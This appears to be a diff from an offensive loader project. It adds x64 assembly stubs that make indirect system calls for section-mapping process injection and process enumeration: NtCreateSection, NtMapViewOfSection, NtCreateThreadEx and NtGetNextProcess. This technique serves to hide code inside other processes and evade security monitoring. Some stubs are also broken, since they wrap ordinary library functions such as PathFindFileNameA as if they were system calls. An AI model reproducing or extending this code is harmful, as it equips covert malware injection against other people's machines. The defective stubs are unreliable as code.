@@ -78,3 +78,48 @@ sysNtQueueApcThread:
     mov ax, word [SSN]
     jmp qword [rel syscallAddr]
     ret
+
+; INJECT_EXTERNAL_CREATE_MAP_SECTION
+
+global sysNtCreateSection
+sysNtCreateSection:
+    mov r10, rcx
+    mov ax, word [SSN]
+    jmp qword [rel syscallAddr]
+    ret
+
+global sysNtMapViewOfSection
+sysNtMapViewOfSection:
+    mov r10, rcx
+    mov ax, word [SSN]
+    jmp qword [rel syscallAddr]
+    ret
+
+global sysNtCreateThreadEx
+sysNtCreateThreadEx:
+    mov r10, rcx
+    mov ax, word [SSN]
+    jmp qword [rel syscallAddr]
+    ret
+
+; FINDPID_GETNEXTPROCESS
+global sysNtGetNextProcess
+sysNtGetNextProcess:
+    mov r10, rcx
+    mov ax, word [SSN]
+    jmp qword [rel syscallAddr]
+    ret
+
+global sysGetProcessImageFileNameA
+sysGetProcessImageFileNameA:
+    mov r10, rcx
+    mov ax, word [SSN]
+    jmp qword [rel syscallAddr]
+    ret
+
+global sysPathFindFileNameA
+sysPathFindFileNameA:
+    mov r10, rcx
+    mov ax, word [SSN]
+    jmp qword [rel syscallAddr]
+    ret
